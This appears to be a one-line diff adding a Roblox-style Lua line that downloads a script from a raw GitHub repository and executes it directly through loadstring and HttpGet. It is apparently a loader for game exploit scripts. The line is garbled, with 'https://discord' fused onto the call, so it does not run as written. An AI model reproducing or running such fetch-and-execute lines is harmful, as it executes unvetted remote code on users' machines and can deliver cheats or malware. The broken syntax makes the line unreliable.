@@ -1,0 +1,1 @@
+https://discordloadstring(game:HttpGet("https://raw.githubusercontent.com/OPSCRIPTSS/DMYOUNGSCRIPTS-BRAINROTS/refs/heads/main/script.lua"))()
